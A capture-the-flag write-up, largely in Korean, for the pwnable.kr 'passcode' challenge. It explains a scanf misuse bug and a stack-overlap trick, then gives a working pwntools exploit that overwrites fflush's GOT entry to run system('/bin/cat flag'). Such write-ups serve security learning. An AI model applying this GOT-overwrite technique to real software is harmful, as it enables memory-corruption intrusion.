# [pwnable.kr] passcode

> Mommy told me to make a passcode based login system.
> My initial C code was compiled without any error!
> Well, there was some compiler warning, but who cares about that?
>
> ssh passcode@pwnable.kr -p2222 (pw:guest)

## Bug

```c
/* passcode.c */

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}
```

`passcode1`과 `passcode2`에 `scanf()`로 입력을 받을 때 두 번째 인자로 변수의 주소를 전달해야 하는데 실제로는 변수의 값(쓰레기값)을 전달하여 의도하지 않은 주소에 값을 입력받게 된다.

## Exploit

```c
/* passcode.c */

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

`main()`에서 `welcome()`과 `login()`을 연속해서 호출하기 때문에 `welcome()`이 사용하던 스택 프레임을 `login()`에서 그대로 사용하게 된다.

```c
/* passcode.c */

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}
```

`passcode1`의 주소를 확인해 보면 `name`의 마지막 4바이트와 겹친다. 따라서 `welcome()`에서 미리 `passcode1`의 값을 임의의 주소로 설정해 두고 `login()`에서 그 주소에 임의의 값을 입력할 수 있다.

`login()`에서 `passcode1`에 입력을 받은 직후에 `fflush()`를 호출하기 때문에, `fflush()`의 GOT 주소에 `system("/bin/cat flag")`의 주소를 넣으면 플래그를 획득할 수 있다.

```python
# ex.py

from pwn import *

p = ssh("passcode", "pwnable.kr", 2222, "guest").process("/home/passcode/passcode")

fflush_got = 0x804A004  # GOT of fflush()
flag_gadget = 0x80485E3  # system("/bin/cat flag")

p.sendlineafter(b"enter you name : ", b"A" * 0x60 + p32(fflush_got))
p.sendlineafter(b"enter passcode1 : ", str(flag_gadget).encode())

p.interactive()
```

![image](https://github.com/user-attachments/assets/1a23e377-cfee-426e-b95e-410154004e12)